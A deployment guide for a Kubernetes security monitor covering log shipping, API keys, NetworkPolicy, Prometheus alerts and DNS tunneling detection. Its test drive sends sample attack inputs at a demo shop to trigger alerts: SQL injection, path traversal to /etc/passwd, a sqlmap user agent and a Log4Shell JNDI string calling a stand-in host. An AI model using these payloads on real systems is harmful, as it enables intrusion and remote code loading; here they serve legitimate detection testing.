# SÄKERHET — assembly instructions

**Security monitor for a Kubernetes namespace full of microservices.**
One monitor, one log shipper, a few labels. About one hour, two terminals recommended.

```
   ┌──────────┐      ┌──────────────────────┐      ┌────────────┐      ┌──────────────────┐
   │ Internet │ ───▶ │ ingress-nginx        │ ───▶ │ shop/api   │      │ security/        │
   └──────────┘      │ (access log in the   │      │ shop/web … │      │ security-monitor │
                     │  monitor's format)   │      └─────┬──────┘      │                  │
                     └──────────┬───────────┘            │ failed      │  rules → alerts  │
                                │ stdout                 │ logins      │  /metrics        │
                     ┌──────────▼───────────┐            └───────────▶ │  /alerts         │
                     │ Fluent Bit (logging) │ ── POST /events/batch ─▶ │                  │
                     └──────────▲───────────┘                          └────────┬─────────┘
                                │ optional: CoreDNS query log                   │ scrape
                                                                        ┌───────▼────────┐
                                                                        │ Prometheus →   │
                                                                        │ Alertmanager   │
                                                                        └────────────────┘
```

Steps 1–8, the test drive and the DNS kit were assembled and tested end to end on local clusters (kind, Kubernetes 1.34, ingress-nginx 1.15, Fluent Bit 5.1, Calico 3.30 for the NetworkPolicy); the expected outputs below come from those runs. Step 9 (Prometheus Operator) and kit C were not run in a cluster — kit C's manifests were rendered with `kubectl kustomize`. The [appendix](#appendix-try-it-on-your-laptop-with-kind) shows how to try it on your laptop.

---

## 📦 In the box

| Part | File | |
|------|------|--|
| A | Namespace with the strictest Pod Security Standard | [`deploy/kubernetes/namespace.yaml`](../deploy/kubernetes/namespace.yaml) |
| B | Monitor: Deployment, Service, ServiceAccount | [`deploy/kubernetes/deployment.yaml`](../deploy/kubernetes/deployment.yaml) |
| C | NetworkPolicy ("who may talk to the monitor") | [`deploy/kubernetes/networkpolicy.yaml`](../deploy/kubernetes/networkpolicy.yaml) |
| D | Kustomization tying A–C together | [`deploy/kubernetes/kustomization.yaml`](../deploy/kubernetes/kustomization.yaml) |
| E | ingress-nginx values (access log format) | [`deploy/kubernetes/ingress-nginx-values.yaml`](../deploy/kubernetes/ingress-nginx-values.yaml) |
| F | Fluent Bit values (log shipper) | [`deploy/kubernetes/fluent-bit-values.yaml`](../deploy/kubernetes/fluent-bit-values.yaml) |
| G | Prometheus alerts (optional) | [`deploy/kubernetes/monitoring.yaml`](../deploy/kubernetes/monitoring.yaml) |
| H | Demo shop with two microservices (for the test drive) | [`deploy/kubernetes/demo/shop.yaml`](../deploy/kubernetes/demo/shop.yaml) |

## 🔧 Tools you need

- `kubectl`, `helm`, `docker` and a container registry the cluster can pull from
- A cluster running **ingress-nginx** as the entry point for your microservices
- A CNI that **enforces NetworkPolicies** (Calico, Cilium, most managed clusters; *not* kind's default)
- Optional: the Prometheus Operator (e.g. kube-prometheus-stack), an Anthropic API key

## ⚠️ Read this before you start

> **1 × monitor, not 3.** Events, alerts and rule windows live in memory. Run exactly one replica (the Deployment does). A restart forgets the history — forward alerts to Prometheus/Alertmanager (step 9) so nothing important only lives in the monitor.

> **The real client IP or nothing.** Every rule counts per IP. If the ingress sees your load balancer's IP instead of the client's, all traffic looks like one very busy client. Step 5 shows the switch.

> **HTTP inside the cluster.** Clients authenticate with API keys; the NetworkPolicy (step 8) decides who may connect at all. Use a service mesh if in-cluster traffic must be encrypted.

---

## Step 1 — Build the monitor 🏗️

```bash
docker build -t registry.example.com/security/security-monitor:1.0.0 .
docker push registry.example.com/security/security-monitor:1.0.0
```

Put your registry and tag into [`kustomization.yaml`](../deploy/kubernetes/kustomization.yaml):

```yaml
images:
  - name: security-monitor
    newName: registry.example.com/security/security-monitor
    newTag: "1.0.0"
```

✅ **Check:** `docker images` lists the image (~25 MB).

## Step 2 — Unfold the namespace 📂

```bash
kubectl apply -f deploy/kubernetes/namespace.yaml
```

The namespace `security` enforces the `restricted` Pod Security Standard. The monitor needs no privileges: non-root, read-only filesystem, no capabilities, no Kubernetes API access.

✅ **Check:** `kubectl get ns security --show-labels` shows `pod-security.kubernetes.io/enforce=restricted`.

## Step 3 — Cut the keys 🔑

One key per client, so each one can be replaced on its own:

```bash
FLUENTBIT_KEY=$(openssl rand -hex 32)
SHOP_KEY=$(openssl rand -hex 32)

kubectl -n security create secret generic security-monitor \
  --from-literal=api-keys="$FLUENTBIT_KEY,$SHOP_KEY"
```

Keep both values; steps 6 and 7 hand them to the clients.

✅ **Check:** `kubectl -n security get secret security-monitor` exists.

## Step 4 — Mount the monitor 🔩

```bash
kubectl apply -k deploy/kubernetes
kubectl -n security rollout status deployment/security-monitor
```

This creates the Deployment (1 replica, `Recreate` updates, 256–512 MiB memory), the Service `security-monitor:8080` and the NetworkPolicy.

✅ **Check:**

```bash
kubectl -n security port-forward svc/security-monitor 8080:8080 &
curl localhost:8080/health                       # {"status":"ok",…}
curl -H "Authorization: Bearer $SHOP_KEY" localhost:8080/events   # {"count":0,…}
```

## Step 5 — Teach the ingress to speak "event" 🗣️

ingress-nginx writes its access log directly in the monitor's event format — including which namespace, ingress and service a request was for. The log shipper then only has to forward lines, no field mapping.

```bash
helm upgrade --install ingress-nginx ingress-nginx/ingress-nginx \
  -n ingress-nginx --reuse-values -f deploy/kubernetes/ingress-nginx-values.yaml
```

(`--reuse-values` keeps your existing settings; the file only adds `controller.config` keys and `externalTrafficPolicy`.)

> ⚠️ **Real client IP** — pick the line in [`ingress-nginx-values.yaml`](../deploy/kubernetes/ingress-nginx-values.yaml) that matches your load balancer:
> - L4 load balancer: `externalTrafficPolicy: Local` (the default in the file)
> - L7 load balancer / CDN setting `X-Forwarded-For`: `use-forwarded-headers: "true"` plus `proxy-real-ip-cidr` of the balancer
> - PROXY protocol: `use-proxy-protocol: "true"`

✅ **Check:** send any request through the ingress, then

```bash
kubectl -n ingress-nginx logs deploy/ingress-nginx-controller --tail=1
```

shows a JSON line like

```json
{"timestamp":"2026-09-29T21:07:27+00:00","ip":"203.0.113.14","event_type":"http_request","path":"/api/products?id=1","status_code":200,"user_agent":"Mozilla/5.0 …","message":"GET /api/products?id=1 HTTP/1.1","metadata":{"method":"GET","host":"shop.example.com","referer":"","namespace":"shop","ingress":"shop","service":"api","source":"ingress-nginx"}}
```

and `ip` is a real client address, not your load balancer.

## Step 6 — Connect the log shipper 🚚

Fluent Bit runs on every node, reads the ingress controller's log and posts it to the monitor in batches.

```bash
kubectl create namespace logging
kubectl -n logging create secret generic security-monitor-api-key --from-literal=api-key="$FLUENTBIT_KEY"

helm repo add fluent https://fluent.github.io/helm-charts
helm install fluent-bit fluent/fluent-bit -n logging -f deploy/kubernetes/fluent-bit-values.yaml
```

Already running Fluent Bit for Loki or Elasticsearch? Don't install a second one — copy the `[INPUT]`, `[FILTER]` and `[OUTPUT]` sections tagged `secmon.*` from [`fluent-bit-values.yaml`](../deploy/kubernetes/fluent-bit-values.yaml) into your existing configuration.

> The path `/var/log/containers/*_ingress-nginx_controller-*.log` assumes the controller runs in namespace `ingress-nginx` with container `controller` (the Helm chart's default). Adjust it if yours differs.

✅ **Check:** after some traffic, the events arrive — with the targeted microservice:

```bash
curl -s -H "Authorization: Bearer $SHOP_KEY" "localhost:8080/events?limit=2"
```

```json
{"count":2,"total":8,"events":[{"ip":"10.244.0.14","event_type":"http_request","path":"/","status_code":200,"metadata":{"namespace":"shop","service":"frontend",…}},…]}
```

## Step 7 — Let the services report what the ingress can't see 📣

The ingress sees requests, not their meaning: a failed login often answers `200` with an error page or `302` back to the form. Only the service knows. Let it tell the monitor:

```bash
kubectl label namespace shop security-monitor/client=true          # allowed by the NetworkPolicy
kubectl -n shop create secret generic security-monitor-api-key --from-literal=api-key="$SHOP_KEY"
```

Give the service the two environment variables and send the event when a login fails:

```yaml
env:
  - name: SECURITY_MONITOR_URL
    value: http://security-monitor.security.svc.cluster.local:8080
  - name: SECURITY_MONITOR_API_KEY
    valueFrom:
      secretKeyRef: { name: security-monitor-api-key, key: api-key }
```

```go
// reportFailedLogin tells the security monitor about a failed login. Call it in
// a goroutine: the login path must never wait for, or fail because of, the monitor.
func reportFailedLogin(clientIP, user string) {
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	body, _ := json.Marshal(map[string]any{
		"ip":         clientIP, // the real client: X-Real-IP set by ingress-nginx
		"event_type": "failed_login",
		"message":    "invalid credentials",
		"metadata":   map[string]string{"service": "shop/api", "user": user},
	})
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, os.Getenv("SECURITY_MONITOR_URL")+"/events", bytes.NewReader(body))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+os.Getenv("SECURITY_MONITOR_API_KEY"))
	if resp, err := http.DefaultClient.Do(req); err == nil {
		resp.Body.Close()
	}
}
```

✅ **Check:** five failed logins from one IP within a minute produce a `BruteForce` alert (the fifth request answers `201 Created`).

## Step 8 — Lock the doors 🔒

The NetworkPolicy from step 4 lets exactly three kinds of clients in: namespace `logging` (Fluent Bit), namespaces labelled `security-monitor/client=true` (step 7) and namespace `monitoring` (Prometheus). Outgoing traffic is limited to DNS and HTTPS (for the optional AI analysis).

✅ **Check:** from a namespace that is *not* labelled, the monitor must be unreachable:

```bash
kubectl run outsider --rm -it --image=curlimages/curl --restart=Never -- \
  curl -m 5 http://security-monitor.security.svc.cluster.local:8080/health
# → timeout
```

If this answers `200`, your CNI does not enforce NetworkPolicies — see [🔧 Tools](#-tools-you-need).

## Step 9 — Hang up the alarm bell 🔔 *(optional, recommended)*

With the Prometheus Operator, enable [`monitoring.yaml`](../deploy/kubernetes/monitoring.yaml) in `kustomization.yaml` (uncomment the line) and set the `release:` label to what your Prometheus selects. It brings:

| Alert | Fires when |
|-------|------------|
| `SecurityAlertCritical` | a critical alert (command injection, multi-vector attack) occurred in the last 5 minutes |
| `SecurityAlertHigh` | a high alert (SQL injection, brute force, port scan, DNS tunneling, …) occurred |
| `SecurityMonitorNoEvents` | no events for 15 minutes — the log shipper or ingress logging is broken |
| `SecurityMonitorDown` | the monitor is not reachable |
| `SecurityMonitorEvictingEarly` | memory is too small for the event volume (raise `MAX_EVENTS` and the memory limit) |

Prometheus only knows *that* something happened. The details — which IP, which rule, which service — are in the monitor: `GET /alerts`.

✅ **Check:** the target `security-monitor` is `UP` in Prometheus.

## Step 10 — Test drive 🚗

Pretend to be an attacker from inside the cluster (replace host and ingress address with yours):

```bash
kubectl run attacker --rm -it --image=curlimages/curl --restart=Never -- sh -c '
  H="Host: shop.example.com"; B=http://ingress-nginx-controller.ingress-nginx.svc
  curl -s -o /dev/null -H "$H" "$B/.env"
  curl -s -o /dev/null -H "$H" "$B/api/search?q=%27%20OR%201%3D1--"
  curl -s -o /dev/null -H "$H" "$B/api/files?name=..%2f..%2fetc%2fpasswd"
  curl -s -o /dev/null -H "$H" -A "sqlmap/1.8" "$B/api/products?id=1"
  curl -s -o /dev/null -H "$H" -A "\${jndi:ldap://evil.example/a}" "$B/"'

curl -s -H "Authorization: Bearer $SHOP_KEY" "localhost:8080/alerts?limit=10"
```

✅ **Expected** (from the test run):

| Severity | Rule | Why |
|----------|------|-----|
| critical | `CommandInjection` | `${jndi:` in the user agent (Log4Shell) |
| critical | `MultiVector` | one source used three different attack techniques |
| high | `SQLInjection` | `' OR 1=1--` in the query |
| medium | `ScannerUserAgent` | `sqlmap` |
| medium | `SensitivePath` | `/.env` |

**Done.** 🎉 Your namespace is watched.

---

## Extra kits

### Kit A — DNS 🌐 (data exfiltration, malware domains)

The ingress only sees traffic *into* the cluster. A compromised pod smuggling data out via DNS names never passes it. The CoreDNS query log does:

1. Add `log` to the CoreDNS configuration (usually after `errors`):
   ```bash
   kubectl -n kube-system edit configmap coredns
   ```
   ```
   .:53 {
       errors
       log
       …
   ```
   CoreDNS reloads it within about a minute.
2. Nothing else: [`fluent-bit-values.yaml`](../deploy/kubernetes/fluent-bit-values.yaml) already reads the CoreDNS log and turns query lines into `dns_query` events.

✅ **Check:** a pod querying 50 different subdomains of one domain within a minute raises `DNSTunneling` (tested: `50 distinct subdomains of evil-example.net queried by 10.244.0.16`).

> The alert names the **pod IP**. Pod IPs change; look it up soon: `kubectl get pods -A -o wide | grep <ip>`. Every DNS query becomes an event — size `MAX_EVENTS` and the memory limit for your query rate.

### Kit B — AI analysis 🤖

```bash
kubectl -n security create secret generic security-monitor \
  --from-literal=api-keys="$FLUENTBIT_KEY,$SHOP_KEY" \
  --from-literal=anthropic-api-key="sk-ant-…" \
  --dry-run=client -o yaml | kubectl apply -f -
kubectl -n security rollout restart deployment/security-monitor
```

The monitor switches AI analysis on by itself when the key is present. The Deployment only analyzes `high` and `critical` alerts (`AI_MIN_SEVERITY`); the NetworkPolicy already allows HTTPS out. See the README's [AI analysis](../README.md#ai-analysis) for providers (Anthropic, OpenAI, local Ollama) and what leaves the cluster.

✅ **Check:** the log shows `"msg":"AI analysis enabled","provider":"anthropic"`, and new high alerts get `ai_analysis.status: "completed"`.

### Kit C — Your own rules 📐

Copy [`internal/service/rules/default.json`](../internal/service/rules/default.json) to `deploy/kubernetes/rules.json`, edit it, and append to `kustomization.yaml`:

```yaml
configMapGenerator:
  - name: security-monitor-rules
    files:
      - rules.json

patches:
  - target:
      kind: Deployment
      name: security-monitor
    patch: |-
      - op: add
        path: /spec/template/spec/volumes
        value:
          - name: rules
            configMap:
              name: security-monitor-rules
      - op: add
        path: /spec/template/spec/containers/0/volumeMounts
        value:
          - name: rules
            mountPath: /etc/security-monitor
            readOnly: true
      - op: add
        path: /spec/template/spec/containers/0/env/-
        value:
          name: RULES_FILE
          value: /etc/security-monitor/rules.json
```

Every change to `rules.json` gets a new ConfigMap name, so `kubectl apply -k` restarts the monitor with the new rules.

> ⚠️ **Check the file before applying it.** The monitor refuses to start with an invalid rule file (strict validation), and with `Recreate` the old pod is already gone at that point. Let the image validate it first:
> ```bash
> docker run --rm -v "$PWD/deploy/kubernetes/rules.json:/rules.json:ro" -e RULES_FILE=/rules.json \
>   registry.example.com/security/security-monitor:1.0.0
> ```
> Valid: the log shows `"detection rules loaded"` and the server starts (stop it with Ctrl+C). Invalid: it exits immediately and names the rule and the problem, e.g. `rule #3 "SQLInjection": invalid regex …`.

Typical additions: allow-list your own monitoring (`"except": [{"ip": ["10.0.0.0/8"]}]`), a threshold rule per service (`"group_by": "metadata.service"`).

---

## What this setup does *not* see

Be honest with yourself about the blind spots:

| Blind spot | Why | If you need it |
|------------|-----|----------------|
| Service-to-service traffic | It never passes the ingress | DNS kit (A); flow logs of Cilium Hubble or Calico, sent to `POST /events/batch` |
| Connections of pods | The monitor's connection collector reads the host's table; pods have their own network namespaces | Same as above |
| Node firewalls | Node-level logs | Run the monitor's firewall collector on the nodes, or ship `ufw.log`/`kern.log` via Fluent Bit |
| Attacks inside encrypted payloads, application logic flaws | Only request metadata is analyzed | WAF, application-level events (step 7) |

---

## Care instructions 🧽

**Looking at alerts**

```bash
kubectl -n security port-forward svc/security-monitor 8080:8080
curl -s -H "Authorization: Bearer $SHOP_KEY" "localhost:8080/alerts?limit=20"
curl -s -H "Authorization: Bearer $SHOP_KEY" "localhost:8080/alerts?ip=203.0.113.77"
```

**Updating** — push a new image tag, set it in `kustomization.yaml`, `kubectl apply -k deploy/kubernetes`. The pod is replaced (`Recreate`); Fluent Bit retries while it restarts, so no events are lost, but the in-memory history starts fresh.

**Rotating a key** — add the new key to `api-keys` (`old,new`), roll out, switch the client, remove the old key, roll out again.

**Sizing** — about 0.9 KiB per stored event. `MAX_EVENTS=200000` fits the 512 MiB limit; raise both together. Detection itself does not need the stored events (rules keep their own windows), so a smaller store only shortens what `GET /events` can show.

**Troubleshooting**

| Symptom | Likely cause | Fix |
|---------|--------------|-----|
| `GET /events` stays empty | Fluent Bit path does not match the controller's log file | `kubectl -n logging logs ds/fluent-bit` shows the watched files (`inotify_fs_add`); adjust `Path` |
| Fluent Bit reports HTTP 401 | Key in `logging/security-monitor-api-key` is not in `api-keys` | Compare the two secrets |
| Fluent Bit cannot connect | NetworkPolicy: Fluent Bit is not in namespace `logging` | Move it or add its namespace to the policy |
| No JSON in the ingress log | Values from step 5 not applied, or requests hit the default backend (unknown host) | `helm get values ingress-nginx -n ingress-nginx`; test with a host that has an Ingress |
| Every alert has the same IP | The load balancer's IP, not the client's | Step 5, real client IP |
| Pod `OOMKilled` | Event volume too high for the limit | Lower `MAX_EVENTS` or raise `limits.memory` (and `GOMEMLIMIT` to ~80 % of it) |
| Service events rejected with 400 | Invalid field (e.g. `ip` missing or not an address) | The response names every invalid field |

---

## Appendix: try it on your laptop with kind

```bash
kind create cluster --name secmon
docker build -t registry.example.com/security/security-monitor:1.0.0 .
kind load docker-image registry.example.com/security/security-monitor:1.0.0 --name secmon

# ingress-nginx for kind, then the log format from step 5 as ConfigMap keys
kubectl label node secmon-control-plane ingress-ready=true
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml
#   → add the keys under controller.config in ingress-nginx-values.yaml to the
#     ConfigMap ingress-nginx/ingress-nginx-controller (kubectl edit)

# steps 2–4 and 6 as above, then the demo shop (host shop.local)
kubectl apply -f deploy/kubernetes/demo/shop.yaml
```

Wait until `kubectl -n shop get ingress shop` is synced before the test drive — requests for a host without an Ingress go to nginx's default server, which does not write access logs. kind's default network plugin ignores NetworkPolicies; to test step 8, create the cluster with `networking.disableDefaultCNI: true` and install Calico. If image pulls fail inside the cluster (corporate proxies), `docker pull` on the host and `kind load docker-image` the images. If `helm` cannot download charts because GitHub release downloads are blocked, Fluent Bit's chart is also published as an OCI image: `helm install fluent-bit oci://ghcr.io/fluent/helm-charts/fluent-bit -n logging -f deploy/kubernetes/fluent-bit-values.yaml`.

When you're done: `kind delete cluster --name secmon`.
